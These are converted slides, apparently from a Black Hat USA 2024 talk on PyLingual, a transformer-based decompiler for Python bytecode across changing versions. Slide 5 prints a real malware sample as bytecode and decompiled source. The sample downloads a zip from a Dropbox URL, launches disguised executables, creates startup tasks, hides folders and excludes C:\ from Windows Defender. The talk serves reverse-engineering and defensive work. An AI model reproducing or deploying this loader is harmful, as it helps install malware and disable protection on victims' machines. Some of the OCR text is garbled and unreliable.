---
title: "PyLingual A Python Decompilation Framework for Evolving Python Versions"
speakers: ["Josh Wiedemeier", "Elliot Tarbet", "Max Zheng", "Jerry Teng", "Ximeng Liu", "Muhyun Kim", "Sang Kil Cha", "Jessica Ouyang", "Kangkook Jee"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Josh Wiedemeier & Elliot Tarbet & Max Zheng & Jerry Teng & Ximeng Liu & Muhyun Kim & Sang Kil Cha & Jessica Ouyang & Kangkook Jee_PyLingual A Python Decompilation Framework for Evolving Python Versions.pdf"
pages: 80
sha256: "cddc535f5f85f39911f6c0ef0dc497cda910ef59a521c3c01eacf98342f1aa53"
text_chars: 23225
ocr_pages: 21
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:48:03Z"
---
# PyLingual A Python Decompilation Framework for Evolving Python Versions

**Speakers:** Josh Wiedemeier, Elliot Tarbet, Max Zheng, Jerry Teng, Ximeng Liu, Muhyun Kim, Sang Kil Cha, Jessica Ouyang, Kangkook Jee  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Josh Wiedemeier & Elliot Tarbet & Max Zheng & Jerry Teng & Ximeng Liu & Muhyun Kim & Sang Kil Cha & Jessica Ouyang & Kangkook Jee_PyLingual A Python Decompilation Framework for Evolving Python Versions.pdf` (80 pages)


## Slide 1

PyLingual: A Python Decompilation Framework for Evolving Python Versions

### Josh Wiedemeier

#BHUSA @BlackHatEvents

## Slide 2

# Hello!

Sang Kil Cha

Kangkook Jee

Jessica Ouyang

**Josh Wiedemeier**

Simon Liu

Elliot Tarbet

Max Zheng

Jerry Teng

AWS Logo PNG Transparent Images - PNG All

Muhyun Kim

#BHUSA @BlackHatEvents

## Slide 3

# Python is Popular

Source: PYPL

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
\
aN
Python is Popular
Worldwide, Jul 2024 : Source: PYPL
Rank Change
Language Share 1-year trend
Python 29.35 % +1.5 %
Java 15.6 % -0.2 %
JavaScript 8.49 % -0.8 %
#BHUSA @BlackHatEvents
```

## Slide 4

# People Use It to Make Malware

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
QO | ‘ : va <y >
lackhat
> merit Ll ,
Python Malware On The Rise
Cyborg Labs | July 14, 2020
A Closer Look at the Locky Poser, PyLocky
Ransomware UNBOXING SNAKE - PYTHON INFOSTEALER
LURKING THROUGH MESSAGING SERVICES
TRISIS Malwa re PoetRAT: Python RAT uses COVID-19 lures to target
Analysis of Safety System Targeted Malware Azerbaijan public and private sectors
MALWARE By Warren Mercer
Python-Based PWOBot Targets European
Organizations
#BHUSA @BlackHatEvents
```

## Slide 5

```
6LOAD_GLOBAL1 (getpass)
8LOAD_METHOD2 (getuser)
10 CALL_METHOD0 (0 positionalarguments)
12 STORE_FAST0 (username)
14 LOAD_GLOBAL3 (os)
16 LOAD_ATTR4 (path)
18 LOAD_METHOD5 (join)
20 LOAD_GLOBAL6 (tempfile)
22 LOAD_METHOD7 (gettempdir)
24 CALL_METHOD0 (0 positionalarguments)
26 LOAD_CONST1 ('yh')
28 CALL_METHOD2 (2 positionalarguments)
30 STORE_FAST1 (temp_dir)
```

```
32 LOAD_GLOBAL3 (os)
34 LOAD_ATTR4 (path)
36 LOAD_METHOD8 (exists)
38 LOAD_FAST1 (temp_dir)
40 CALL_METHOD1 (1 positionalargument)
42 POP_JUMP_IF_TRUE27 (to54)
44 LOAD_GLOBAL3 (os)
46 LOAD_METHOD9 (makedirs)
48 LOAD_FAST1 (temp_dir)
50 CALL_METHOD1 (1 positionalargument)
52 POP_TOP
```

# Here’s One

```
54 LOAD_CONST2 ('https://www.dropbox.com/s/a18glsr0gxo16zd/yh.zip?dl=1')
```

```
56 STORE_FAST2 (zip_url)
```

```
58 LOAD_GLOBAL3 (os)
60 LOAD_ATTR4 (path)
62 LOAD_METHOD5 (join)
64 LOAD_FAST1 (temp_dir)
66 LOAD_CONST3 ('yh.zip')
68 CALL_METHOD2 (2 positionalarguments)
70 STORE_FAST3 (zip_file)
```

```
72 LOAD_GLOBAL3 (os)
```

```
74 LOAD_ATTR4 (path)
```

## main

```
76 LOAD_METHOD5 (join)
```

```
78 LOAD_FAST1 (temp_dir)
80 LOAD_CONST4 ('download')
82 CALL_METHOD2 (2 positionalarguments)
84 STORE_FAST4 (download_dir)
```

```
86 LOAD_GLOBAL3 (os)
88 LOAD_ATTR4 (path)
90 LOAD_METHOD8 (exists)
92 LOAD_FAST4 (download_dir)
94 CALL_METHOD1 (1 positionalargument)
96 POP_JUMP_IF_TRUE54 (to108)
```

```
98 LOAD_GLOBAL3 (os)
100 LOAD_METHOD9 (makedirs)
102 LOAD_FAST4 (download_dir)
104 CALL_METHOD1 (1 positionalargument)
106 POP_TOP
```

```
108 SETUP_FINALLY19 (to148)
```

```
110 LOAD_CONST5 (0)
112 LOAD_CONST0 (None)
114 IMPORT_NAME10 (urllib.request)
116 STORE_FAST5 (urllib)
```

```
118 LOAD_FAST5 (urllib)
120 LOAD_ATTR11 (request)
122 LOAD_METHOD12 (urlretrieve)
124 LOAD_FAST2 (zip_url)
126 LOAD_FAST3 (zip_file)
128 CALL_METHOD2 (2 positionalarguments)
130 POP_TOP
```

```
132 LOAD_GLOBAL13 (extract_zip)
134 LOAD_FAST3 (zip_file)
136 LOAD_FAST4 (download_dir)
138 LOAD_CONST6 ('989')
140 CALL_FUNCTION3 (3 positionalarguments)
142 POP_TOP
144 POP_BLOCK
146 JUMP_FORWARD26 (to200)
```

```
disable_task_manager()
username = getpass.getuser()
temp_dir= os.path.join(tempfile.gettempdir(),'yh')
ifnotos.path.exists(temp_dir):
os.makedirs(temp_dir)
```

```
zip_url='https://www.dropbox.com/s/a18glsr0gxo16zd/yh.zip?dl=1'
zip_file= os.path.join(temp_dir,'yh.zip')
download_dir= os.path.join(temp_dir,'download')
ifnotos.path.exists(download_dir):
os.makedirs(download_dir)
```

```
try:
```

```
importurllib.request
urllib.request.urlretrieve(zip_url,zip_file)
extract_zip(zip_file,download_dir,'989')
exceptException ase:
```

```
print(f'Errordownloading/extracting zip: {e}')
returnNone
else:
```

```
exe_files= [('path.exe','manual'),('com surrogate.exe','registry'),('steam.exe','winservice')]
v2v2_dir = os.path.join('C:\\Users',username,'AppData','Local','v2v2')
ifnotos.path.exists(v2v2_dir):
os.makedirs(v2v2_dir)
forexe_file,task_nameinexe_files:
shutil.move(os.path.join(download_dir,exe_file),os.path.join(v2v2_dir,exe_file))
subprocess.Popen(os.path.join(v2v2_dir,exe_file))
create_startup_task(os.path.join(v2v2_dir,exe_file),task_name)
```

```
hide_folder(v2v2_dir)
hide_task_scheduler_shortcut()
exclude_from_windows_defender('C:\\')
enable_task_manager()
```

```
148 DUP_TOP
150 LOAD_GLOBAL14 (Exception)
152 JUMP_IF_NOT_EXC_MATCH99 (to198)
154 POP_TOP
156 STORE_FAST6 (e)
158 POP_TOP
160 SETUP_FINALLY14 (to190)
```

```
162 LOAD_GLOBAL15 (print)
164 LOAD_CONST7 ('Errordownloading/extractingzip: ')
166 LOAD_FAST6 (e)
168 FORMAT_VALUE0
170 BUILD_STRING2
172 CALL_FUNCTION1 (1 positionalargument)
174 POP_TOP
```

```
176 POP_BLOCK
178 POP_EXCEPT
180 LOAD_CONST0 (None)
182 STORE_FAST6 (e)
184 DELETE_FAST6 (e)
186 LOAD_CONST0 (None)
188 RETURN_VALUE
190 LOAD_CONST0 (None)
```

#BHUSA @BlackHatEvents

## Slide 6

# Code Object Hierarchy

<module>
extract_zip disable_task_manager
is_admin enable_task_manager
hide_folder exclude_from_windows_defender
create_startup_task hide_task_scheduler_shortcut
main

#BHUSA @BlackHatEvents

## Slide 7

# Code Object Hierarchy

## extract_zip

#BHUSA @BlackHatEvents

## Slide 8

# Translating Bytecode

```
0LOAD_GLOBAL0 (zipfile)
```

- `2` `LOAD_METHOD 1 (ZipFile` `)`

- `4` `LOAD_FAST 0 (zip_file` `)`

- `6` `LOAD_CONST 1 ('` `r')`

- `8` `CALL_METHOD 2 (2 positional arguments` `)`

```
10 SETUP_WITH19 (to50)
```

```
12 STORE_FAST3 (zip_ref)
```

```
...
```

#BHUSA @BlackHatEvents

## Slide 9

# Translating Bytecode

```
0LOAD_GLOBAL0 (zipfile)
2LOAD_METHOD1 (ZipFile)
4LOAD_FAST0 (zip_file)
6LOAD_CONST1 ('r')
8CALL_METHOD2 (2 positionalarguments)
10 SETUP_WITH19 (to50)
12 STORE_FAST3 (zip_ref)
...
```

```
zipfile.ZipFile
```

#BHUSA @BlackHatEvents

## Slide 10

# Translating Bytecode

```
0LOAD_GLOBAL0 (zipfile)
2LOAD_METHOD1 (ZipFile)
4LOAD_FAST0 (zip_file)
```

```
6LOAD_CONST1 ('r')
```

```
8CALL_METHOD2 (2 positionalarguments)
10 SETUP_WITH19 (to50)
12 STORE_FAST3 (zip_ref)
...
```

```
zipfile.ZipFile
```

<stack_expr `>(zip_file, ‘r’)`

#BHUSA @BlackHatEvents

## Slide 11

# Translating Bytecode

```
0LOAD_GLOBAL0 (zipfile)
```

```
2LOAD_METHOD1 (ZipFile)
```

```
4LOAD_FAST0 (zip_file)
```

```
6LOAD_CONST1 ('r')
```

```
8CALL_METHOD2 (2 positionalarguments)
10 SETUP_WITH19 (to50)
12 STORE_FAST3 (zip_ref)
```

```
zipfile.ZipFile(zip_file, ‘r’)
```

```
...
```

#BHUSA @BlackHatEvents

## Slide 12

# Translating Bytecode

```
0LOAD_GLOBAL0 (zipfile)
2LOAD_METHOD1 (ZipFile)
4LOAD_FAST0 (zip_file)
6LOAD_CONST1 ('r')
8CALL_METHOD2 (2 positionalarguments)
10 SETUP_WITH19 (to50)
12 STORE_FAST3 (zip_ref)
...
```

```
zipfile.ZipFile(zip_file, ‘r’)
```

`with` <stack_expr> `as zip_ref:`

#BHUSA @BlackHatEvents

## Slide 13

# Translating Bytecode

- `0` `LOAD_GLOBAL 0 (zipfile` `)`

- `2` `LOAD_METHOD 1 (ZipFile` `)`

- `4` `LOAD_FAST 0 (zip_file` `)`

- `6` `LOAD_CONST 1 ('` `r')`

- `8` `CALL_METHOD 2 (2 positional arguments` `)`

- `10 SETUP_WITH 19 (` `to` `50) 12 STORE_FAST 3 (zip_ref` `)`

```
with zipfile.ZipFile(
zip_file, ‘r’
) as zip_ref:
```

```
...
```

#BHUSA @BlackHatEvents

## Slide 14

Translating Bytecode `14 LOAD_FAST 3 (zip_ref) zip_ref.extractall 16 LOAD_ATTR 2 (extractall) 18 LOAD_FAST 1 (extract_to) 20 LOAD_FAST 2 (password) 22 LOAD_METHOD 3 (encode) 24 LOAD_CONST 2 ('utf-8') 26 CALL_METHOD 1 (1 positional argument) 28 LOAD_CONST 3 (('path', 'pwd')) 30 CALL_FUNCTION_KW 2 (2 total positional and keyword args) 32 POP_TOP 34 POP_BLOCK`

#BHUSA @BlackHatEvents

## Slide 15

# Translating Bytecode

```
14 LOAD_FAST3 (zip_ref)
zip_ref.extractall
16 LOAD_ATTR2 (extractall)
18 LOAD_FAST1 (extract_to)extract_to
20 LOAD_FAST2 (password)
22 LOAD_METHOD3 (encode)
24 LOAD_CONST2 ('utf-8')
26 CALL_METHOD1 (1 positionalargument)
28 LOAD_CONST3 (('path', 'pwd'))
30 CALL_FUNCTION_KW2 (2 totalpositionalandkeywordargs)
32 POP_TOP
34 POP_BLOCK
```

#BHUSA @BlackHatEvents

## Slide 16

# Translating Bytecode

```
14 LOAD_FAST3 (zip_ref)
zip_ref.extractall
16 LOAD_ATTR2 (extractall)
18 LOAD_FAST1 (extract_to)extract_to
20 LOAD_FAST2 (password)
22 LOAD_METHOD3 (encode)
password.encode(‘utf-8’)
24 LOAD_CONST2 ('utf-8')
26 CALL_METHOD1 (1 positionalargument)
28 LOAD_CONST3 (('path', 'pwd'))
30 CALL_FUNCTION_KW2 (2 totalpositionalandkeywordargs)
32 POP_TOP
34 POP_BLOCK
```

#BHUSA @BlackHatEvents

## Slide 17

# Translating Bytecode

```
14 LOAD_FAST3 (zip_ref)
16 LOAD_ATTR2 (extractall)
zip_ref.extractall(
18 LOAD_FAST1 (extract_to)path=extract_to,
20 LOAD_FAST2 (password)pwd=password.encode(‘utf-8’)
)
22 LOAD_METHOD3 (encode)
24 LOAD_CONST2 ('utf-8')
```

```
26 CALL_METHOD1 (1 positionalargument)
28 LOAD_CONST3 (('path', 'pwd'))
```

```
30 CALL_FUNCTION_KW2 (2 totalpositionalandkeywordargs)
```

- `32 POP_TOP`

```
34 POP_BLOCK
```

#BHUSA @BlackHatEvents

## Slide 18

- `36 LOAD_CONST 0 (None)`

# Translating Bytecode

- `38 DUP_TOP`

- `40 DUP_TOP`

```
42 CALL_FUNCTION3 (3 positionalarguments)
44 POP_TOP
```

- `46 LOAD_CONST 0 (None)`

- `48 RETURN_VALUE`

- `50 WITH_EXCEPT_START`

## This is all implicit!

- `52 POP_JUMP_IF_TRUE 28 (to 56)`

- `54 RERAISE 1`

- `56 POP_TOP`

- `58 POP_TOP`

- `60 POP_TOP`

- `62 POP_EXCEPT`

- `64 POP_TOP`

- `66 LOAD_CONST 0 (None)`

- `68 RETURN_VALUE`

#BHUSA @BlackHatEvents

## Slide 19

# Translating Bytecode

```
with zipfile.ZipFile(zip_file, ‘r’) as zip_ref:
zip_ref.extractall(
path=extract_to,
pwd=password.encode(‘utf-8’)
)
```

#BHUSA @BlackHatEvents

## Slide 20

The Rest of The Example

<module>
extract_zip disable_task_manager
is_admin enable_task_manager
hide_folder exclude_from_windows_defender
create_startup_task hide_task_scheduler_shortcut
main

#BHUSA @BlackHatEvents

## Slide 21

# Let’s Use a Decompiler

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
> 5 \ : a ~ naa
‘pikdkhat : | | oo PF e
~~~. USA 2024
Let’s Use a Decompiler
— rocky / python-uncompyle6 Public YW Star 3.6k
fl rocky / python-decompile3 Public) = ¥% Star 1.1k
#BHUSA @BlackHatEvents
```

## Slide 22

# Let’s Use a Decompiler

**Unsupported Python version** , 3.10.0, for decompilation

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat | l
—~—. USA 2024 aa a
Let’s Use a Decompiler
— rocky / python-uncompyle6 | Public YY Star 3.6k
rocky / python-decompile3 | Public yy Star 1.1k
Unsupported Python version, 3.10.0, for decompilation
```

## Slide 23

# Let’s Use a Decompiler

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
SS ° ‘ e 2 \ ; ee . Aan
biSekhat | ar
— USA 2024 < Z
Let’s Use a Decompiler
A zrax/pycde Public) Ye Star 3k
#BHUSA @BlackHatEvents
```

## Slide 24

Let’s Use a Decompiler

**Unsupported opcode** : RERAISE pass # WARNING: Decompyle incomplete

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bikekhat = . —
USA 2024
Let’s Use a Decompiler
a zrax / pycdc Public YW Star 3k
Unsupported opcode: RERAISE
pass
# WARNING: Decompyle incomplete
```

## Slide 25

# What’s The Problem?

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Vee} ~ aimed
4 y \ es ~
blackhat wy <i
—_. USA 2024 2
What’s The Problem?
Python Bytecode Opcode Instability Across Versions
507) mee New Opcodes
Mm Removed Opcodes
40+| Sl Modified Opcodes
‘nos z=
3.10 3.11 3.12
python Version
#BHUSA @BlackHatEvents
```

## Slide 26

# New Python Every Year

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat — > | lf
~~ USA 2024 <a a
New Python Every Year
Python 2.6
Python 2.7
Python 3.0
Python 3.1
Python 3.2
Python 3.3
Python 3.4
Python 3.5
Python 3.6
Python 3.7
Python 3.8 security
Python 3.9 security
Python 3.10
Python 3.11
Python 3.12
Python 3.13
Python 3.14
25 | ‘26 | ‘27 | ‘28 | ‘29 | °30
#BHUSA @BlackHatEvents
```

## Slide 27

# Can AI Save Us?

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat  — — li
; USA 2024 : a
Can Al Save Us?
§ Here's the translation of the provided Python 3.10 bytecode into source code:
python (} Copy code
with zipfile.ZipFile(zip file, ‘r') as zip ref:
Zip ref.extractall(path=extract to, pwd=password.encode(‘utf-8'))
#BHUSA @BlackHatEvents
```

## Slide 28

# Not Quite

Original

## Compiled + Decompiled

```
ifcondition1:
ifcondition2:
first()
else:
second()
last()
```

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
blackhat  — /
~~. USA 2024 = \ |
Not Quite
Original Compiled + Decompiled
Sy Here is the translation of the provided Python 3.10 bytecode into source code:
if condition1:
if condition2: Python copy code
f 1 r st ( ) if condition1:
if condition2:
else: Bo
second( ) second()
last()
last()
#BHUSA @BlackHatEvents
```

## Slide 29

# Let’s Work With This

Language Models: **Flexible** but **Approximate**

Decompiler Programs: **Rigid** but **Precise**

#BHUSA @BlackHatEvents

## Slide 30

# All-Terrain Decompiler

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q LP. \
blackhat . i
USA 2024 | SS
All-Terrain Decompiler
Python Bytecode Opcode Instability Across Versions
507 ses New Opcodes
Mmm Removed Opcodes
40+ Ml Modified Opcodes
3.10 3.11 3.12
236 3.7 3.8 3.9
Python Version
#BHUSA @BlackHatEvents
```

## Slide 31

# PyLingual

Bytecode Segmentation Statement Translation Control Flow Reconstruction

#BHUSA @BlackHatEvents

## Slide 32

# Bytecode Segmentation

0  LOAD_GLOBAL (print) 2  LOAD_CONST (‘Hello’) 4  CALL_FUNCTION 1 6  POP_TOP 8  LOAD_CONST (3) 10 STORE_FAST (a) 12 LOAD_FAST (a) 14 RETURN_VALUE

print(‘Hello’)
a = 3
return a

#BHUSA @BlackHatEvents

## Slide 33

# Bytecode Segmentation

0  LOAD_GLOBAL (print) 2  LOAD_CONST (‘Hello’) 4  CALL_FUNCTION 1 6  POP_TOP 8  LOAD_CONST (3) 10 STORE_FAST (a) 12 LOAD_FAST (a) 14 RETURN_VALUE

print(‘Hello’)
a = 3
return a

#BHUSA @BlackHatEvents

## Slide 34

# Statement Mapping

`lnotab =` Line Number Table

```
Traceback (most recent call last):
File “…”, line 3, in <module>
```

#BHUSA @BlackHatEvents

## Slide 35

# Lines Are Not Statements

```
print(‘Hello’); a = 3;returna
```

print(
‘Hello’
)

#BHUSA @BlackHatEvents

## Slide 36

# But Statements Can Be Lines

ast.parse()
print(
ast.unparse()
‘Hello’
)
a = 3;return a

print(‘Hello’)
a = 3
return a

#BHUSA @BlackHatEvents

## Slide 37

# Segmentation Model

0  LOAD_GLOBAL (print) 2  LOAD_CONST (‘Hello’) 4  CALL_FUNCTION 1 6  POP_TOP 8  LOAD_CONST (3) 10 STORE_FAST (a) 12 LOAD_FAST (a) 14 RETURN_VALUE

BERT (~110M)

Language Model

0  LOAD_GLOBAL (print) 2  LOAD_CONST (‘Hello’) 4  CALL_FUNCTION 1 6  POP_TOP

8  LOAD_CONST (3) 10 STORE_FAST (a)

12 LOAD_FAST (a) 14 RETURN_VALUE

#BHUSA @BlackHatEvents

## Slide 38

# PyLingual

Bytecode Segmentation

Statement Translation Control Flow Reconstruction

#BHUSA @BlackHatEvents

## Slide 39

# Translation Out of The Box

¿Hablas bytecode de Python?

Do you speak Python bytecode?

#BHUSA @BlackHatEvents

## Slide 40

# Simple Translation

¿ Hablas  bytecode de Python?

Do you  speak  Python bytecode?

#BHUSA @BlackHatEvents

## Slide 41

Reordering and Copying

¿Hablas **bytecode** de **Python** ?

Do you speak **Python bytecode** ?

#BHUSA @BlackHatEvents

## Slide 42

# Implied Semantics

¿Hablas bytecode de Python?

**Do you** speak Python bytecode?

#BHUSA @BlackHatEvents

## Slide 43

# Translation Model

```
0 LOAD_GLOBAL0 (zipfile)
2 LOAD_METHOD1 (ZipFile)
4 LOAD_FAST0 (zip_file)
6 LOAD_CONST1 ('r')
```

```
8 CALL_METHOD2
```

```
10 SETUP_WITH19 (to50)
12 STORE_FAST3 (zip_ref)
```

**T5**

(~223M)

Language Model

```
withzipfile.Zipfile(zip_file, ‘r’)\
aszip_ref:
```

```
14 LOAD_FAST3 (zip_ref)
```

```
…
```

#BHUSA @BlackHatEvents

## Slide 44

# Tricks

- Bytecode Normalization

See white paper for details!

- Top-K Segmentation

- Statement Corrector Model

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
lackhat | )
=o | a
PyLINGUAL: A Python Decompilation Framework for Evolving Python Versions
Josh Wiedemeier, Elliot Tarbet, Max Zheng, Jerry Teng, Ximeng Liu,
Muhyun Kim, Sang Kil Cha, Jessica Ouyang, Kangkook Jee
¢ Bytecode Normalization
¢ Top-K Segmentation aa
« Statement Corrector Model
#BHUSA @BlackHatEvents
```

## Slide 45

# PyLingual

Bytecode Segmentation Statement Translation Control Flow Reconstruction

#BHUSA @BlackHatEvents

## Slide 46

# We Have Statements, Now What?

```
withzipfile.Zipfile(zip_file, ‘r’) aszip_ref:
```

```
zip_ref.extractall(path=extract_to, pwd=password.encode(‘utf-8’))
```

#BHUSA @BlackHatEvents

## Slide 47

# We Have Statements, Now What?

```
withzipfile.Zipfile(zip_file, ‘r’) aszip_ref:
zip_ref.extractall(path=extract_to, pwd=password.encode(‘utf-8’))
```

#BHUSA @BlackHatEvents

## Slide 48

# Control Flow Graph

… `10 SETUP_WITH 19 (to 50)`

#BHUSA @BlackHatEvents

## Slide 49

# Control Flow Graph

…
10 SETUP_WITH 19 (to 50)
…
34 POP_BLOCK

#BHUSA @BlackHatEvents

## Slide 50

# Control Flow Graph

…
10 SETUP_WITH 19 (to 50)
…
34 POP_BLOCK
…
48 RETURN_VALUE

#BHUSA @BlackHatEvents

## Slide 51

# Control Flow Graph

…
10 SETUP_WITH 19 (to 50)
…
50 WITH_EXCEPT_START
34 POP_BLOCK
52 POP_JUMP_IF_TRUE 28 (to 56)
…
48 RETURN_VALUE

#BHUSA @BlackHatEvents

## Slide 52

# Control Flow Graph

…
10 SETUP_WITH 19 (to 50)
…
50 WITH_EXCEPT_START
34 POP_BLOCK
52 POP_JUMP_IF_TRUE 28 (to 56)
…
54 RERAISE 1
48 RETURN_VALUE

#BHUSA @BlackHatEvents

## Slide 53

# Control Flow Graph

…
10 SETUP_WITH 19 (to 50)
…
50 WITH_EXCEPT_START
34 POP_BLOCK
52 POP_JUMP_IF_TRUE 28 (to 56)
… …
54 RERAISE 1
48 RETURN_VALUE 68 RETURN_VALUE

#BHUSA @BlackHatEvents

## Slide 54

Control Dependence Who **decides** if these nodes may execute?

…
10 SETUP_WITH 19 (to 50)
…
50 WITH_EXCEPT_START
34 POP_BLOCK
52 POP_JUMP_IF_TRUE 28 (to 56)
… …
54 RERAISE 1
48 RETURN_VALUE 68 RETURN_VALUE

#BHUSA @BlackHatEvents

## Slide 55

Control Dependence Who **decides** if these nodes may execute?

…
10 SETUP_WITH 19 (to 50)
…
50 WITH_EXCEPT_START
34 POP_BLOCK
52 POP_JUMP_IF_TRUE 28 (to 56)
… …
54 RERAISE 1
48 RETURN_VALUE 68 RETURN_VALUE

#BHUSA @BlackHatEvents

## Slide 56

Control Dependence Who **decides** if these nodes may execute?

…
10 SETUP_WITH 19 (to 50)
…
50 WITH_EXCEPT_START
34 POP_BLOCK
52 POP_JUMP_IF_TRUE
…
54 RERAISERERAISE
48 RETURN_VALUE

50 WITH_EXCEPT_START
52 POP_JUMP_IF_TRUE 28 (to 56)
…
54 RERAISERERAISE 1
68 RETURN_VALUE

#BHUSA @BlackHatEvents

## Slide 57

# Dress Up Time

START

```
withzipfile.Zipfile(zip_file, ‘r’) aszip_ref:
```

```
zip_ref.extractall(path=extract_to, pwd=password.encode(‘utf-8’))
```

#BHUSA @BlackHatEvents

## Slide 58

# Indentation Recovery

START

Level 1

```
withzipfile.Zipfile(zip_file, ‘r’) aszip_ref:
```

```
zip_ref.extractall(path=extract_to, pwd=password.encode(‘utf-8’))
```

#BHUSA @BlackHatEvents

## Slide 59

# Indentation Recovery

START

Level 2 `with zipfile.Zipfile(zip_file, ‘r’) as zip_ref:`

```
zip_ref.extractall(path=extract_to, pwd=password.encode(‘utf-8’))
```

#BHUSA @BlackHatEvents

## Slide 60

# All That For This

```
withzipfile.Zipfile(zip_file, ‘r’) aszip_ref:
zip_ref.extractall(path=extract_to, pwd=password.encode(‘utf-8’))
```

#BHUSA @BlackHatEvents

## Slide 61

# PyLingual

## Bytecode Segmentation

Statement Translation

Control Flow Reconstruction

#BHUSA @BlackHatEvents

## Slide 62

The Rest of The Example

<module>
extract_zip disable_task_manager
is_admin enable_task_manager
hide_folder exclude_from_windows_defender
create_startup_task hide_task_scheduler_shortcut
main

#BHUSA @BlackHatEvents

## Slide 63

# Demo

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
GB ¥ Prtingvat
e590
& PyLingual
x +
© B hitps//pylinguatio
‘About Recently Viewed
Demo
PyLingual Python Decompiler
PyLingual makes novel use of transformer models to learn new Python bytecode specifications as they are released.
Upload Your .PYC File for Decompilation
Choose a file, or drag and drop to upload.
(Only * pyc files will be accepted)
How to Generate PYC Files
From the command line, run python -m conpileall your_#ile.py to compile with your python version.
The compiled .py¢ file will be saved in the _pycache__ directory.
Video Tutorial
Sample Files
Further, PyLingualis the first Python decompiler to verify the results of decompilation and localize unknown semantic errors.
eno x +
oe Cc O > = demo Search de
Ore % O @ = Drreew
a] tase
| ez anes iis
'
»
\
Tis (eee es
a
os @=e
#BHUSA @BlackHatEvents
```

## Slide 64

# Yay Automation! But…

<module>
extract_zip disable_task_manager
is_admin enable_task_manager
hide_folder exclude_from_windows_defender
create_startup_task hide_task_scheduler_shortcut
main

#BHUSA @BlackHatEvents

## Slide 65

# Don’t Trust the Process

Manual Verification

Equivalence Modulo Inputs

=

Perfect Decompilation

#BHUSA @BlackHatEvents

## Slide 66

# Don’t Trust the Process

Manual Verification

Equivalence Modulo Inputs

=

Perfect Decompilation

#BHUSA @BlackHatEvents

## Slide 67

# Don’t Trust the Process

Manual Verification

Equivalence Modulo Inputs

=

Perfect Decompilation

#BHUSA @BlackHatEvents

## Slide 68

# Don’t Trust the Process

Manual Verification

Equivalence Modulo Inputs

=

Perfect Decompilation

#BHUSA @BlackHatEvents

## Slide 69

# Perfect Decompilation

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
———-< USA 2024
Perfect Decompilation
#BHUSA @BlackHatEvents
```

## Slide 70

Full results in Evaluation Highlights white paper File-level Perfect Decompilation rates on 3,000 random PyPI files

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q a a A
blackhat |
USA 2024 | SS
Evaluation Highlights Full results in
white paper
File-level Perfect Decompilation rates on 3,000 random PyPI files
100%
90%
80%
>
U
Som o—»—_0— © —-e~_
3
Zz 60% =@= PyLingual 4H
S 509% =@= Uncompyle6 |
- ° =@= Decompyle3
2 40% =@= Pycdc H
3 30%
fa
20%
m%)O 0 0 0 oO 6
0% T T T T T T T
3.6 3.7 3.8 3.9 3.10 3.11 3.12
Python Version #BHUSA @BlackHatEvents
```

## Slide 71

# Error Localization

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
—.USA 2024
Error Localization
63 if pes:
a es SKUPINE = Wee RENINCATON |
65 return ©
#BHUSA @BlackHatEvents
```

## Slide 72

# Closing The Loop

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ 4 \ zy \ nara
: SS
2)
blackhat ’
~~. USA 2024 ,
Closing The Loop
63 if pcs:
= 64 Tes eraieeinceie ee
65 return ©
366 14 LOAD FAST 1 (pcs) 357 14 LOAD FAST 1 (pcs)
367 16 LOAD CONST 1 ("snoitcennoCtnerrucnoc’ ) 358 16 LOAD CONST 1 ("snoitcennoCtnerrucnoc' )
368-18 LOAD_CONST @ (None) 359+18 BENARVISUBSER
369 2@ LOAD CONST @ (None) 368 2@ LOAD CONST @ (None)
370-22 LOAD CONST 2 (-1) 36142
371-24 BUILD SLICE 3 362 LOAD CONST 2 (-1)
372-26 BINARY_SUBSCR 363 BUILD SLICE 3
373 28 BINARY_SUBSCR 364 28 BINARY_SUBSCR
374 30 POP_BLOCK 365 30 POP_BLOCK
375 32 RETURN VALUE 366 32 RETURN VALUE
#BHUSA @BlackHatEvents
```

## Slide 73

# Closing The Loop

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
~~. USA 2024
_blackhat - “ | <i
Closing The Loop
63 if pcs:
2] 4 EES TIRSIEiieinesE ee ee
65 return @
366 14 LOAD FAST 1 (pcs) 357 14 LOAD FAST 1 (pcs)
367 16 LOAD CONST 1 ("snoitcennoCtnerrucnoc’ ) 358 16 LOAD CONST 1 ("snoitcennoCtnerrucnoc' )
368-18 LOAD_CONST @ (None) 359+18 BENARVISUBSER o—
369 2@ LOAD CONST @ (None) 36@ 2@ LOAD CONST @® (None)
378-22 LOAD CONST 2 (-1) 36142
371-24 BUILD SLICE 3 362 LOAD CONST 2 (-1)
372-26 BINARY SUBSCR a 363 BUILD SLICE 3
